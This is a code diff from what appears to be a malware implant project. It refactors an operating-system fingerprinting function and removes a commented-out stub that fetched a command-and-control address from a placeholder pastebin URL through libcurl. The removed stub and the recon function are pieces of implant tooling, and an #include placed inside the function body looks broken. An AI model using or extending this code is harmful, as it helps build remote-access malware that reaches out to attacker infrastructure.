@@ -1,15 +1,10 @@
 #include "implant_utils.h"
 
-//#include <curl//curl.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
-#ifdef _WIN32
-#include <windows.h>
-#elif __linux__ || __APPLE__
-#include <sys/utsname.h>
-#endif
+#include "platform.h"
 
 char *operating_system_info()
 {
@@ -25,7 +20,8 @@ char *operating_system_info()
              version.dwMinorVersion);
 
 #elif __linux__ || __APPLE__
-    // Unix/Linux/Mac
+// Unix/Linux/Mac
+#include <sys/utsname.h>
     struct utsname info;
     uname(&info);
     snprintf(os_info, 512, "%s | %s | %s | %s",
@@ -39,18 +35,3 @@ char *operating_system_info()
 
     return os_info;
 }
-
-// char *fetch_c2_address()
-// {
-
-//     CURL *curl = curl_easy_init();
-
-//     // 2. set options
-//     curl_easy_setopt(curl, CURLOPT_URL, "https://pastebin.com/raw/yourpaste");
-
-//     // 3. perform the request
-//     curl_easy_perform(curl);
-
-//     // 4. cleanup
-//     curl_easy_cleanup(curl);
-// }
